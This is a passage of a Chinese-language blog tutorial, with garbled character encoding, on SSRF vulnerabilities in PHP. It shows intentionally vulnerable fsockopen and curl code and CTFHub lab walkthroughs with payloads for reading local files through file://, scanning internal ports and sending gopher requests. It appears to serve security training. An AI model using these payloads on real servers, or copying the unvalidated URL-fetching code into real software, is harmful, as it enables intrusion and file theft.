href="#2-fsockopen-å‡½æ•°" class="headerlink" title="2.fsockopen()å‡½æ•°"></a>2.fsockopen()å‡½æ•°</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; <span class="comment">//å®šä¹‰äº†æ–‡ä»¶åä¸ºGetFileçš„å‡½æ•°ï¼Œå‚æ•°ä¸º$host(è¦è¿æ¥çš„ä¸»æœºå),$port(è¦è¿æ¥çš„ç«¯å£å·),$link(è¦è·å–çš„æ–‡ä»¶è·¯å¾„)</span></span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); <span class="comment">//ä½¿ç”¨fsockopenå‡½æ•°è¿æ¥åˆ°æŒ‡å®šçš„ä¸»æœºå’Œç«¯å£ï¼Œå¦‚æœè¿æ¥å¤±è´¥ï¼Œfsockopenå‡½æ•°è¿”å›falseï¼Œå¹¶ä¸”é”™è¯¯å·å’Œé”™è¯¯ä¿¡æ¯ä¼šè¢«ä¼ é€’ç»™$errnoå’Œ$errstr</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;   <span class="comment">//å¦‚æœè¿æ¥å¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; <span class="comment">//å¦‚æœè¿æ¥æˆåŠŸï¼Œæ„é€ HTTPè¯·æ±‚å¤´</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; <span class="comment">//HTTPè¯·æ±‚å¤´çš„ä¸»æœºå</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; <span class="comment">//HTTPè¯·æ±‚å¤´çš„è¿æ¥çŠ¶æ€</span></span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; <span class="comment">//HTTPè¯·æ±‚å¤´çš„ç»“æŸç¬¦</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); <span class="comment">//å‘æœåŠ¡å™¨å‘é€HTTPè¯·æ±‚å¤´</span></span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; <span class="comment">//å®šä¹‰ä¸€ä¸ªå˜é‡$contentsï¼Œç”¨æ¥å­˜å‚¨æœåŠ¡å™¨è¿”å›çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;  <span class="comment">//feofå‡½æ•°æ£€æµ‹æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°äº†æ–‡ä»¶ç»“æŸçš„ä½ç½®</span></span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); <span class="comment">//fgetså‡½æ•°ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œ</span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); <span class="comment">//å…³é—­æ–‡ä»¶æŒ‡é’ˆ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; <span class="comment">//è¿”å›æœåŠ¡å™¨è¿”å›çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fsockopenå‡½æ•°å®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ï¼Œè¯¥å‡½æ•°ä½¿ç”¨socket(ç«¯å£)è·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“æ•°æ®ã€‚å˜é‡hostä¸ºä¸»æœºåï¼Œportä¸ºç«¯å£ï¼Œerrstrè¡¨ç¤ºé”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ï¼Œ30ä¸ºæ—¶é™ã€‚</p></blockquote><p>æµ‹è¯•ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ ssrf.php?url=<a href="http://www.baidu.com/">www.baidu.com</a> å³å¯æˆåŠŸè§¦å‘ssrfå¹¶è¿”å›ç™¾åº¦ä¸»é¡µï¼Œè¿™ç§æ›´åƒæ˜¯ä¸€ç§é‡å®šå‘ (302) ä¹‹ç±»çš„ï¼Œæ²¡ä»€ä¹ˆç”¨ã€‚</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230917111524399.png" alt="image-20230917111524399"></p><h3 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3.curl_exec()"></a>3.curl_exec()</h3><p>curl_init(url) å‡½æ•°åˆå§‹åŒ–ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œè¿”å›ä¸€ä¸ª curl å¥æŸ„ï¼Œä¾›<code>curl_setopt()ï¼Œcurl_exec()å’Œcurl_close()</code>å‡½æ•°ä½¿ç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123; <span class="comment">//æ£€æŸ¥æ˜¯å¦é€šè¿‡POSTæ–¹æ³•æ¥æ”¶åˆ°åä¸ºurlçš„å˜é‡ï¼Œå¦‚æœæ¥æ”¶åˆ°äº†ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œå¤§æ‹¬å·å†…çš„ä»£ç </span></span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; <span class="comment">//å°†æ¥æ”¶åˆ°çš„urlå˜é‡çš„å€¼èµ‹å€¼ç»™$linkå˜é‡</span></span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(); <span class="comment">//åˆå§‹åŒ–curlå¯¹è±¡</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>); <span class="comment">//è®¾ç½®curlå¯¹è±¡çš„å‚æ•°ï¼ŒCURLOPT_POSTè¡¨ç¤ºè®¾ç½®ä¸ºPOSTæ–¹æ³•,CURLOPT_POST, 1è¡¨ç¤ºè®¾ç½®ä¸ºPOSTæ–¹æ³•ï¼ŒCURLOPT_POST,0è¡¨ç¤ºè®¾ç½®ä¸ºGETæ–¹æ³•</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>); <span class="comment">//è®¾ç½®curlå¯¹è±¡çš„å‚æ•°ï¼ŒCURLOPT_URLè¡¨ç¤ºè¦è®¿é—®çš„ç½‘å€ï¼Œå³$linkçš„å€¼</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">//è®¾ç½®curlå¯¹è±¡çš„å‚æ•°ï¼ŒCURLOPT_RETURNTRANSFERä¸º1è¡¨ç¤ºå°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥æ–‡ä»¶æµçš„å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>); <span class="comment">//æ‰§è¡Œcurlæ“ä½œï¼Œå°†è¿”å›çš„ä¿¡æ¯èµ‹å€¼ç»™$resultå˜é‡</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>); <span class="comment">//å…³é—­å¹¶é‡Šæ”¾curlä¼šè¯èµ„æº</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>; <span class="comment">//è®¾ç½®éšæœºæ–‡ä»¶åï¼Œ./curled/è¡¨ç¤ºå°†æ–‡ä»¶ä¿å­˜åœ¨å½“å‰ç›®å½•ä¸‹çš„curledæ–‡ä»¶å¤¹ä¸­ï¼Œrand()è¡¨ç¤ºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œ.txtè¡¨ç¤ºæ–‡ä»¶çš„åç¼€å</span></span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>);  <span class="comment">//å°†$resultä¸­çš„å†…å®¹è¿”å›çš„ä¿¡æ¯ä¿å­˜åˆ°$filenameæ–‡ä»¶ä¸­</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;<span class="comment">//è¾“å‡º$resultä¸­çš„å†…å®¹</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="06ssrfçš„å±é™©åè®®"><a href="#06ssrfçš„å±é™©åè®®" class="headerlink" title="06ssrfçš„å±é™©åè®®"></a>06ssrfçš„å±é™©åè®®</h2><blockquote><p>1.fileåè®®ç»“åˆç›®å½•éå†è¯»å–æ–‡ä»¶</p><p>2.gopheråè®®æ‰“å¼€ç«¯å£</p><p>3.dictåè®®ä¸»è¦ç”¨äºç»“åˆcurlæ”»å‡»</p><p>4.httpåè®®è¿›è¡Œå†…ç½‘æ¢æµ‹</p></blockquote><p>ctfhubé¶åœºssrfç»ƒä¹ éƒ¨åˆ†</p><h3 id="ç¬¬ä¸€éƒ¨åˆ†ï¼ˆHttpã€Dictå’Œfileç­‰åè®®çš„åˆ©ç”¨ï¼‰"><a href="#ç¬¬ä¸€éƒ¨åˆ†ï¼ˆHttpã€Dictå’Œfileç­‰åè®®çš„åˆ©ç”¨ï¼‰" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ†ï¼ˆHttpã€Dictå’Œfileç­‰åè®®çš„åˆ©ç”¨ï¼‰"></a>ç¬¬ä¸€éƒ¨åˆ†ï¼ˆHttpã€Dictå’Œfileç­‰åè®®çš„åˆ©ç”¨ï¼‰</h3><h4 id="å†…ç½‘è®¿é—®"><a href="#å†…ç½‘è®¿é—®" class="headerlink" title="å†…ç½‘è®¿é—®"></a>å†…ç½‘è®¿é—®</h4><p><strong>é¢˜ç›®æè¿°</strong>:å°è¯•è®¿é—®ä½äº127.0.0.1çš„flag.phpå§</p><p>æ‰“å¼€é¢˜ç›®</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924150826928.png" alt="image-20230924150826928"></p><p>çœ‹åˆ°è¿™æ ·çš„urlä¸‹æ„è¯†æƒ³åˆ°ssrfï¼Œé¢˜ç›®æ˜¯è®©æˆ‘ä»¬ä»ä¸»æœºå†…ç½‘ç¯å¢ƒè®¿é—®å…¶æœ¬åœ°çš„flag.php,é‚£æˆ‘ä»¬å°±æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>èƒ½æˆåŠŸè®¿é—®åˆ°ç›®æ ‡æœºæœ¬åœ°çš„flag.php:</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924151407594.png" alt="image-20230924151407594"></p><h4 id="ä¼ªåè®®è¯»å–æ–‡ä»¶"><a href="#ä¼ªåè®®è¯»å–æ–‡ä»¶" class="headerlink" title="ä¼ªåè®®è¯»å–æ–‡ä»¶"></a>ä¼ªåè®®è¯»å–æ–‡ä»¶</h4><blockquote><p><strong>çŸ¥è¯†ç‚¹ï¼šURLä¼ªåè®®ä¹‹fileåè®®</strong></p><p>file:///  â€“ æœ¬åœ°æ–‡ä»¶ä¼ è¾“åè®®ï¼Œä¸»è¦ç”¨äºè®¿é—®æœ¬åœ°è®¡ç®—æœºä¸­çš„æ–‡ä»¶</p></blockquote><p><strong>é¢˜ç›®æè¿°</strong>:å°è¯•å»è¯»å–ä¸€ä¸‹Webç›®å½•ä¸‹çš„flag.phpå§</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨å»ç›´æ¥è®¿é—®flag.phpæ˜¯å¾—ä¸åˆ°flagçš„ï¼š</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924152943463.png" alt="image-20230924152943463"></p><p>é¢˜ç›®è¯´çš„æ˜¯ä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œåœ¨SSRFä¸­å¸¸ç”¨çš„ä¼ªåè®®å°±æ˜¯file:///åè®®äº†ï¼Œå…¶åœ¨ssrfä¸­å¯ä»¥ç”¨æ¥è¯»å–phpæºç ã€‚è¯•ä¸€ä¸‹æ„é€ payloadï¼š</p><blockquote><p>é€šå¸¸webç›®å½•ä¸º<code>/var/www/html</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924153641658.png" alt="image-20230924153641658"></p><p>å³é”®æŸ¥çœ‹æºç ï¼Œå³å¯å¾—åˆ°flag</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924153728994.png" alt="image-20230924153728994"></p><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>é¢˜ç›®æè¿°ï¼šæ¥æ¥æ¥æ€§æ„ŸCTFHubåœ¨çº¿æ‰«ç«¯å£,æ®è¯´ç«¯å£èŒƒå›´æ˜¯8000-9000å“¦ã€‚</p><p>æ‰“å¼€é¢˜ç›®ï¼Œè¿˜æ˜¯ä¸€æ ·çš„é¡µé¢</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924160528507.png" alt="image-20230924160528507"></p><p>é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬æ˜¯å†…ç½‘ç«¯å£æ‰«æï¼Œé‚£æˆ‘ä»¬åˆ©ç”¨ssrfæ¼æ´æ¢æµ‹ç›®æ ‡ä¸»æœºå¼€æ”¾äº†å“ªäº›ç«¯å£ã€‚åœ¨ssrfä¸­å¯ä»¥é€šè¿‡dictåè®®å’Œhttpåè®®æ¥æ¢æµ‹å†…ç½‘ä¸»æœºå­˜è´§ä¸ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚</p><blockquote><p>dict://   â€“ å­—å…¸æœåŠ¡å™¨åè®®ï¼Œdictæ˜¯åŸºäºæŸ¥è¯¢ç›¸åº”çš„TCPåè®®ï¼ŒæœåŠ¡å™¨ç›‘å¬ç«¯å£2628</p></blockquote><p>ç«¯å£æ‰«ææˆ‘ä»¬ç”¨burpsuiteæ¥å®Œæˆã€‚é¦–å…ˆæŠ“åŒ…ï¼Œå‘é€åˆ°Intruderè¿›è¡Œçˆ†ç ´è®¾ç½®ï¼š</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924161815082.png" alt="image-20230924161815082"></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924173941394.png" alt="image-20230924173941394"></p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924174435930.png" alt="image-20230924174435930"></p><p>çº¿ç¨‹è®¾ç½®</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924174555386.png" alt="image-20230924174555386"></p><p>é€‰æ‹©</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924174626627.png" alt="image-20230924174626627"></p><p>å¼€å§‹çˆ†ç ´æ¢æµ‹:</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924174705656.png" alt="image-20230924174705656"></p><p>æˆ‘ä»¬å‘ç°8904ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œresposeå¯ä»¥è¿”å›å¾—åˆ°flagï¼Œä¹Ÿå¯ä»¥è®¿é—®8904ç«¯å£</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230924174938153.png" alt="image-20230924174938153"></p><h3 id="ç¬¬äºŒéƒ¨åˆ†-gopheråè®®çš„åˆ©ç”¨"><a href="#ç¬¬äºŒéƒ¨åˆ†-gopheråè®®çš„åˆ©ç”¨" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†(gopheråè®®çš„åˆ©ç”¨)"></a>ç¬¬äºŒéƒ¨åˆ†(gopheråè®®çš„åˆ©ç”¨)</h3><h4 id="postè¯·æ±‚"><a href="#postè¯·æ±‚" class="headerlink" title="postè¯·æ±‚"></a>postè¯·æ±‚</h4><blockquote><p><strong>çŸ¥è¯†ç‚¹</strong>ï¼šURLä¼ªåè®®ä¹‹gopheråè®®</p></blockquote><ul><li>gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//gopheråè®®</span><br><span class="line">åœ¨wwwå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯internetä¸Šæœ€é‡è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨tcp70ç«¯å£ã€‚ä½†åœ¨wwwå‡ºç°ä»¥åï¼ŒGopherå¤±å»äº†æ˜”æ—¥çš„è¾‰ç…Œ</span><br><span class="line"> //gopheråè®®çš„ç‰¹ç‚¹ï¼š</span><br><span class="line"> gopheråè®®æ”¯æŒå‘å‡ºGET,POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚(æ¢è¡Œä½¿ç”¨`%0d%0a`,ç©ºç™½è¡Œ%0a)</span><br><span class="line"> //gopheråè®®æ ¼å¼ï¼š</span><br><span class="line"> gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;åæ¥TCPæ•°æ®æµ</span><br><span class="line"> //gopheråè®®åœ¨curlå‘½ä»¤ä¸­çš„ä½¿ç”¨æ–¹å¼ï¼š</span><br><span class="line"> crul gopher://localhost:2222/hello%0agopher</span><br></pre></td></tr></table></figure><ul><li>gopheråè®®åœ¨å„ä¸ªç¼–ç¨‹è¯­è¨€ä¸­çš„ä½¿ç”¨é™åˆ¶</li></ul><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230925084630581.png" alt="image-20230925084630581"></p><p><strong>é¢˜ç›®æè¿°</strong>ï¼šè¿™æ¬¡æ˜¯å‘ä¸€ä¸ªHTTP POSTè¯·æ±‚.å¯¹äº†.ssrfæ˜¯ç”¨phpçš„curlå®ç°çš„.å¹¶ä¸”ä¼šè·Ÿè¸ª302è·³è½¬.åŠ æ²¹å§éªšå¹´</p><p>é¢˜ç›®çš„æè¿°æ˜¯æœ‰ä¸€ä¸ª302.phpçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230925085322880.png" alt="image-20230925085322880"></p><p>æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡å·²æœ‰çš„302.phpæ–‡ä»¶ï¼Œè€Œä¸”åº”è¯¥æ˜¯éœ€è¦æˆ‘ä»¬åˆ©ç”¨ssrfå‘ä¸€ä¸ªè¯·æ±‚ã€‚ssrfå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼Œæƒ³åˆ°äº†ç”¨gopheråè®®ï¼ŒåŒæ—¶é¢˜ç›®ä¸­ä¹Ÿè¯´æ˜äº†curlï¼Œè€Œä¸”curlæ­£å¥½æ”¯æŒgopheråè®®ï¼Œè¿™é“é¢˜çš„å¤§æ¦‚æ€è·¯å°±æ˜¯åˆ©ç”¨gopherå‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼Œç„¶åè·å¾—flag</p><p>å¯ä»¥å…ˆè¯•ç€è®¿é—®flag.phpæ–‡ä»¶ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰</p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230925093245401.png" alt="image-20230925093245401"></p><p>æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªè¢«æ³¨é‡Šçš„keyå‚æ•°ï¼Œå¤§æ¦‚å°±æ˜¯è¦é€šè¿‡è¿™ä¸ªpostè¯·æ±‚å¹¶ä¸”å¸¦ä¸Škeyå‚æ•°ï¼Œåˆ©ç”¨gopheråè®®è®¿é—®ï¼Œå°è¯•è®¿é—®302.php,æŸ¥çœ‹æºç </p><p><img src="/2023/09/02/ssrf%E6%BC%8F%E6%B4%9E/image-20230925100308401.png" alt="image-20230925100308401"></p><p>æŠ¥404ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒæœ‰ä¸€äº›é—®é¢˜ï¼Œç„¶ååœ¨ä¸€äº›wpä¸­æ‰¾åˆ°äº†æºç </p><p>302.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: <span class="subst">&#123;$_GET[â€˜urlâ€˜]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠindex.phpçš„æºç è¯»å‡ºæ¥</p><blockquote><p>/?url=file:///var/www/html/index.php</p><p>/?url=file:///var/www/html/flag.php</p></blockquote><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span 